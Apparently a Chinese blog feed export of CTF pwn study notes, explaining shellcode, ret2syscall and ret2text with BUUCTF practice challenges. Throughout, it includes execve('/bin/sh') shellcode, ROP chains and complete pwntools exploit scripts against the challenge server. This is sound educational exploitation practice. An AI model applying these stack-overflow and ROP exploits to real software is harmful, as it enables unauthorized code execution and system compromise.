<h5 id="execve-1"><a href="#execve-1" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f #/bin(2f62696e) /sh(2f7368)</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h5 id="open-read-write-1"><a href="#open-read-write-1" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>​	我们可以利用<code>pwntools</code>中的<code>asm</code>把写好的汇编代码直接转换成机器码</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a><code>others_shellcode</code></h3><p>这道题直接发送<code>shellcode</code>即可，<code>exp</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25752</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351737.png" alt="image-20231210222035500"></p>
<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a><code>ciscn_2019_n_5</code></h3><p>拿到题目，先检查保护，没开保护，<code>64</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353809.png" alt="image-20231210134205669"></p>
<p>拖入<code>ida</code>，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353640.png" alt="image-20231210134506057"></p>
<p>运行程序，有两次输入的地方</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351745.png" alt="image-20231210134611131"></p>
<p><code>Shift+F12</code>查看字符串，没有找到我们想要的<code>/bin/sh</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353023.png" alt="image-20231210134823032"></p>
<p>再看右边函数，也没有<code>system</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351752.png" alt="image-20231210134953135"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210140546109](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352089.png)</span><br><span class="line"></span><br><span class="line">我们可以先把```shellcode```写到```bss```段，然后在栈溢出劫持函数返回地址为```shellcode```的起始地址</span><br><span class="line"></span><br><span class="line">计算偏移量为```0x28```</span><br><span class="line"></span><br><span class="line">![1](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352098.png)</span><br><span class="line"></span><br><span class="line">```exp```如下：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ciscn_2019_n_5&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26032)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall                </span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x601080</span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351950.png" alt="image-20231210150043471"></p>
<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a><code>ez_pz_hackover_2016</code></h3><p>拿到题目，检查保护，<code>PIE,NX,canary</code>都没开，是<code>32</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132352868.png" alt="image-20231210192130416"></p>
<p>拖入<code>ida</code>中，分析题目</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351088.png" alt="image-20231210200953491"></p>
<p>先进入<code>header</code>函数中看看，就是输出图形的，没什么问题</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351942.png" alt="image-20231210201032463"></p>
<p>再进入<code>chall</code>函数中看看，我们主要分析的应该就是这个函数了</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351082.png" alt="image-20231210202908607"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210203253498](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352393.png)</span><br><span class="line"></span><br><span class="line">计算缓冲区到```shellcode```的偏移量为```0x1c```</span><br><span class="line"></span><br><span class="line">![image-20231210200821951](https://raw.githubusercontent.com/Qwen11/picture/main/202503132351108.png)</span><br><span class="line"></span><br><span class="line">`exp`如下：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26101)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash: &#x27;)</span><br><span class="line">s_addr = int(p.recv(10),16)</span><br><span class="line">shellcode_addr = s_addr-28</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload = b&#x27;crashme\x00&#x27;+b&#x27;a&#x27;*18+p32(shellcode_addr)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351863.png" alt="image-20231210215133554"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2syscall学习总结</title>
    <url>/2023/12/09/ret2syscall%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><h3 id="ret2syscall是什么"><a href="#ret2syscall是什么" class="headerlink" title="ret2syscall是什么"></a><code>ret2syscall</code>是什么</h3><p>​	<code>ret2syscall</code>，即<code>return to syscall</code>，意思是劫持函数返回地址为通过<code>ROP</code>构造的系统调用函数的地址，控制程序执行系统调用，拿到<code>shell</code>。</p>
<span id="more"></span>

<h3 id="ROP原理"><a href="#ROP原理" class="headerlink" title="ROP原理"></a><code>ROP</code>原理</h3><blockquote>
<p>​	<code>ROP</code>的全称为<code>Return-oriented programming</code>，即<strong>返回导向编程</strong>。其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段（<code>gadget</code>）来改变某些寄存器或变量的值，从而控制程序的执行流程。</p>
</blockquote>
<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a><code>gadgets</code></h3><blockquote>
<p>​	<code>gadgets</code>就是以<code>ret</code>结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
</blockquote>
<h3 id="ROP攻击执行需要满足的条件"><a href="#ROP攻击执行需要满足的条件" class="headerlink" title="ROP攻击执行需要满足的条件"></a><code>ROP</code>攻击执行需要满足的条件</h3><p>1.存在栈溢出，可以控制返回地址。</p>
<p>2.可以找到满足条件的<code>gadgets</code>及其地址。</p>
<h3 id="有关系统调用的知识"><a href="#有关系统调用的知识" class="headerlink" title="有关系统调用的知识"></a>有关系统调用的知识</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a><code>32</code>位</h4><p>​	<code>32</code>位系统调用的前<code>6</code>个寄存器分别为<code>ebx,ecx,edx,esi,edi,ebp</code>。通过查看<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h32</code>文件，我们可以找到函数的系统调用号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1、把函数的系统调用号放入```eax```寄存器中</span><br><span class="line"></span><br><span class="line">2、把函数参数依次放入寄存器中</span><br><span class="line"></span><br><span class="line">3、执行```int 0x80```指令中断</span><br><span class="line"></span><br><span class="line">#### ```64```位</span><br><span class="line"></span><br><span class="line">​	```64```位系统调用的前```6```个寄存器分别为```rdi,rsi,rdx,rcx,r8,r9```。通过查看```/usr/include/x86_64-linux-gnu/asm/unistd_64.h```文件，我们可以找到函数的系统调用号。</span><br><span class="line"></span><br><span class="line">```64```位应用程序调用系统调用的过程：</span><br><span class="line"></span><br><span class="line">1、把函数的系统调用号放入```rax```寄存器中</span><br><span class="line"></span><br><span class="line">2、把函数参数此次放入寄存器中</span><br><span class="line"></span><br><span class="line">3、执行```syscall```指令</span><br><span class="line"></span><br><span class="line">## 例题</span><br><span class="line"></span><br><span class="line">###  ```inndy_rop```</span><br><span class="line"></span><br><span class="line">拿到题的第一步，先检查一下保护，只开了```NX```保护，并且可知该程序是```32```位的。</span><br><span class="line"></span><br><span class="line">![image-20231209145936854](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354775.png)</span><br><span class="line"></span><br><span class="line">拖入```ida```中，有```gets```函数，可以栈溢出</span><br><span class="line"></span><br><span class="line">![image-20231209162919247](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354081.png)</span><br><span class="line"></span><br><span class="line">计算偏移量为```0x10```</span><br><span class="line"></span><br><span class="line">![image-20231209232158602](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354890.png)</span><br><span class="line"></span><br><span class="line">```syscall```的函数调用规范为```execve(&quot;/bin/sh&quot;,0,0)```，```execve```函数的系统调用号为```11```。</span><br><span class="line"></span><br><span class="line">我们先找到相关的```gadgets```地址，用```ROPgadget --binary rop | grep &quot;pop eax ; ret&quot;```命令寻找```pop eax ; ret```，其他同理</span><br><span class="line"></span><br><span class="line">![image-20231209164349380](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354758.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164436996](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354412.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164618437](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354139.png)</span><br><span class="line"></span><br><span class="line">![image-20231209164548872](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354570.png)</span><br><span class="line"></span><br><span class="line">```int 0x80```指令的地址</span><br><span class="line"></span><br><span class="line">![image-20231209165637692](https://raw.githubusercontent.com/Qwen11/picture/main/202503132354935.png)</span><br><span class="line"></span><br><span class="line">我们还需要找到```pop dword ptr [ecx] ; ret```的地址（也可以是其他普通寄存器，不过这里我们只能找到```ecx```的。```pop dword ptr [ecx]```的意思是**把栈顶的内容弹到指针指的```ecx```中保存的值作为的地址**），利用命令：```ROPgadget --binary rop | grep &quot;pop dword ptr \[ecx\] ; ret&quot;```，注意要用反斜杠进行转义</span><br><span class="line"></span><br><span class="line">![image-20231209203524019](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355878.png)</span><br><span class="line"></span><br><span class="line">```bss```段的地址```0x080eafb8```，我们要把```/bin/sh```写入```bss```段</span><br><span class="line"></span><br><span class="line">![image-20231209170118582](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355914.png)</span><br><span class="line"></span><br><span class="line">这里放一张师父的图片，通过这张图片可以了解把```/bin/sh```写入```bss```段的过程，然后下面的```exp```中我写了相应的解释。</span><br><span class="line"></span><br><span class="line">![img](https://raw.githubusercontent.com/Qwen11/picture/main/202503132355926.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,27738)</span><br><span class="line">#p = process(&#x27;./rop&#x27;)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">int_0x80_addr=0x0806c943</span><br><span class="line">bss_addr=0x080eafb8</span><br><span class="line">pop_eax_addr = 0x080b8016</span><br><span class="line">pop_ebx_addr = 0x080481c9</span><br><span class="line">pop_ecx_addr = 0x080de769</span><br><span class="line">pop_edx_addr = 0x0806ecda</span><br><span class="line">pop_in_ecx_addr=0x0804b5ba           #指向ecx寄存器中的内容</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x10   #栈溢出</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr)   #先把bss_addr这个地址弹到ecx中</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+b&#x27;/bin&#x27;   #ecx中的内容作为地址，/bin被写入这个地址里，即被写到bss_addr这个地址中</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+4)   #这个bss_addr+4是上面bss_addr的地址的衔接，因为参数/bin/sh需要两个内存单元存放，因此在这里将上面的地址加4，/sh就存到了下面的内存单元。</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+b&#x27;/sh\x00&#x27;   #前面同理，最后的\x00用来声明字符串的结束</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(0xb)   #把系统调用号弹到eax中</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)  #把第一个参数的地址弹到ebx中</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(0)   #把第二个参数弹到ecx中</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(0)   #把第三个参数弹到edx中</span><br><span class="line">payload+=p32(int_0x80_addr)   #执行int 0x80中断</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355886.png" alt="image-20231209175629929"></p>
<h3 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h3><p>拿到题目，先看保护，开了<code>NX</code>保护，是<code>32</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355752.png" alt="image-20231209195656602"></p>
<p>拖入<code>ida</code>，有<code>read</code>函数，可以栈溢出</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355365.png" alt="image-20231209195945310"></p>
<p>计算偏移量，这里用<code>cyclic</code>计算偏移量，先复制<code>200</code>个垃圾数据</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355025.png" alt="image-20231210000043823"></p>
<p>输入</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132355656.png" alt="image-20231210000145966"></p>
<p>然后用<code>cyclic -l 0x61616169</code>计算偏移量为<code>32</code>即<code>0x20</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356455.png" alt="image-20231209235925156"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这里我们找不到类似上一题中```pop dword ptr [ecx] ; ret```的```gadgets```，因此我们要用其他方法把```/bin/sh```写入```bss```段。我们可以利用程序中现有的```read```函数，来完成这一步。</span><br><span class="line"></span><br><span class="line">```read```函数地址</span><br><span class="line"></span><br><span class="line">![image-20231209212415936](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356365.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bss```段的地址```0x080eb2a1```</span><br><span class="line"></span><br><span class="line">![image-20231209210856820](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356616.png)</span><br><span class="line"></span><br><span class="line">用```ROPgadget --binary simplerop | grep &quot;int 0x80&quot;```命令找到```int 0x80```指令地址</span><br><span class="line"></span><br><span class="line">![image-20231209202038108](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356455.png)</span><br><span class="line"></span><br><span class="line">寻找```gadgets```</span><br><span class="line"></span><br><span class="line">![image-20231209205944371](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356774.png)</span><br><span class="line"></span><br><span class="line">![image-20231209210024201](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356145.png)</span><br><span class="line"></span><br><span class="line">没有找到```pop ecx ; ret```，但是有```pop edx ; pop ecx ; pop ebx ; ret```，更好了</span><br><span class="line"></span><br><span class="line">![image-20231209210337839](https://raw.githubusercontent.com/Qwen11/picture/main/202503132356930.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">#p = process(&#x27;./simplerop&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28283)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x080eb2a1</span><br><span class="line">int_0x80_addr = 0x080493e1</span><br><span class="line">pop_eax_addr = 0x080bae06</span><br><span class="line">pop_edx_ecx_ebx_addr = 0x0806e850</span><br><span class="line">read_addr = 0x0806cd50</span><br><span class="line">payload = b&#x27;a&#x27;*0x20</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)+p32(pop_edx_ecx_ebx_addr)#先把read函数原来的3个参数弹出</span><br><span class="line">payload += p32(0)+p32(bss_addr)+p32(8)#写入read函数的参数</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_addr)+p32(0xb)#把系统调用号弹到eax中</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bss_addr)#把execve函数的3个参数分别弹到ebx，ecx，edx中</span><br><span class="line">payload += p32(int_0x80_addr)#执行int 0x80中断</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)#这里一定要输入\x00去截断</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356863.png" alt="image-20231209214613569"></p>
<h3 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a><code>picoctf_2018_can_you_gets_me</code></h3><p>拿到题目，先查看保护，只开了<code>NX</code>保护，是<code>32</code>位程序</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356211.png" alt="image-20231209215403163"></p>
<p>拖入<code>ida</code>中，有<code>gets</code>函数，可以栈溢出</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356785.png" alt="image-20231209220934817"></p>
<p>选一个<code>bss</code>段的地址为<code>0x080eba35</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356751.png" alt="image-20231209221129336"></p>
<p>用<code>gdb</code>调试计算偏移量为<code>0x1c</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132356700.png" alt="image-20231209231510597"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">寻找```gadgets```片段</span><br><span class="line"></span><br><span class="line">![image-20231209215819672](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357083.png)</span><br><span class="line"></span><br><span class="line">![image-20231209215908598](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357063.png)</span><br><span class="line"></span><br><span class="line">![image-20231209215943969](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357679.png)</span><br><span class="line"></span><br><span class="line">![image-20231209220018062](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357248.png)</span><br><span class="line"></span><br><span class="line">![image-20231209220149329](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357044.png)</span><br><span class="line"></span><br><span class="line">寻找```int 0x80```中断指令</span><br><span class="line"></span><br><span class="line">![image-20231209220226939](https://raw.githubusercontent.com/Qwen11/picture/main/202503132357595.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./rop3&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26246)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = 0x080b81c6</span><br><span class="line">pop_ebx_addr = 0x080481c9</span><br><span class="line">pop_ecx_addr = 0x080de955</span><br><span class="line">pop_edx_addr = 0x0806f02a</span><br><span class="line">pop_in_ecx_addr = 0x0804b5ea</span><br><span class="line">int_0x80_addr = 0x0806cc25</span><br><span class="line">bss_addr = 0x080eba35</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x1c)</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_in_ecx_addr)+b&#x27;/bin&#x27;</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(bss_addr+4)+p32(pop_in_ecx_addr)+b&#x27;/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line">payload += p32(pop_eax_addr)+p32(0xb)</span><br><span class="line">payload += p32(pop_ebx_addr)+p32(bss_addr)</span><br><span class="line">payload += p32(pop_ecx_addr)+p32(0)</span><br><span class="line">payload += p32(pop_edx_addr)+p32(0)</span><br><span class="line">payload += p32(int_0x80_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132357205.png" alt="image-20231209222917217"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2text学习总结</title>
    <url>/2023/12/07/ret2text%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><h3 id="什么是ret2text"><a href="#什么是ret2text" class="headerlink" title="什么是ret2text"></a>什么是<code>ret2text</code></h3><p>​	<code>ret2text</code>，即<code>return to text</code>，意思是劫持函数返回地址为程序本身就有的代码(<code>.text</code>)，进而控制程序执行后门函数，拿到<code>shell</code>。</p>
<h3 id="strcpy函数溢出"><a href="#strcpy函数溢出" class="headerlink" title="strcpy函数溢出"></a><code>strcpy</code>函数溢出</h3><ul>
<li><p>当源字符串的长度大于目标缓冲区时，<code>strcpy</code>函数会复制整个源字符串，导致栈溢出。</p>
<span id="more"></span>
</li>
<li><p><code>strcpy</code>函数原型</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">strcpy</span><span class="params">(<span class="type">char</span>* destination,<span class="type">const</span> <span class="type">char</span>* source)</span>;</span><br><span class="line"><span class="comment">//destination指向要复制的目标缓冲区</span></span><br><span class="line"><span class="comment">//source指向被复制的源字符串</span></span><br></pre></td></tr></table></figure>

<h3 id="ret2text题目类型"><a href="#ret2text题目类型" class="headerlink" title="ret2text题目类型"></a><code>ret2text</code>题目类型</h3><p>​	第一种是直接劫持返回地址为<code>system(&quot;/bin/sh&quot;)</code>的地址。</p>
<p>​	第二种比第一种稍微复杂了一些，虽然有<code>system</code>函数但是参数不是我们想要的 ，而在程序的其他地方也能找到<code>/bin/sh</code>字符串。这时就需要利用一些<code>gadget</code>给<code>system</code>函数传参。而64位程序和32位程序二者的传参方式也不同。</p>
<h3 id="64位程序和32位程序在函数传参上的不同"><a href="#64位程序和32位程序在函数传参上的不同" class="headerlink" title="64位程序和32位程序在函数传参上的不同"></a>64位程序和32位程序在函数传参上的不同</h3><p>​	32位程序函数传参时，使用栈来传递参数（如<code>_cdecl</code>和<code>_stdcall</code>），参数从右往左压入栈，然后执行<code>call</code>指令跳转到要执行的函数的位置。因此我们攻击时只需构造一个栈结构即可。</p>
<p>​	64位程序函数传参时，先使用寄存器来存储参数，一共有6个存放参数的寄存器分别为<code>rdi,rsi,rdx,rcx,r8,r9</code>，当参数大于6个时多余的参数才通过栈传递。</p>
<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a><code>gadget</code></h3><p>​	<code>gadget</code>通常是以<code>ret</code>结尾的指令序列，如<code>pop rdi ; ret</code>，用于设置寄存器的值。在这里，我们用<code>pop rdi ; ret</code>把<code>/bin/sh</code>放入<code>rdi</code>寄存器中。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题1：buu-jarvisoj-level0"><a href="#例题1：buu-jarvisoj-level0" class="headerlink" title="例题1：buu  jarvisoj_level0"></a><strong>例题1</strong>：<code>buu</code>  <code>jarvisoj_level0</code></h3><p>拿到题目后先<code>checksec level0</code>命令检查一下保护，<code>PIE</code>和<code>canary</code>都没开，开了<code>NX</code>（堆栈不执行）保护。该程序为64位。</p>
<blockquote>
<p>​	<strong><code>canary</code>保护：函数开始执行的时候会先往栈里插入<code>canary</code>值，当函数真正返回的时候会验证<code>canary</code>值是否合法，如果不合法就停止程序运行。可以防止栈溢出覆盖返回地址。</strong></p>
</blockquote>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359646.png" alt="image-20231207130909272" style="zoom:80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359254.png" alt="image-20231207131026174"></p>
<p>定义数组<code>buf[128]</code>,<code>read</code>函数读取，且<code>0x200uLL</code>大于128，可以栈溢出。通过下图</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359093.png" alt="image-20231207131620028"></p>
<p>计算偏移量，为0x80+8</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359586.png" alt="image-20231207131114573"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001740.png" alt="image-20231207131155073"></p>
<p>该题是第一种类型，直接溢出并劫持返回地址为<code>system</code>函数地址0x400596，即可。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359141.png" alt="image-20231207132517025"></p>
<p>最后<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27059</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span 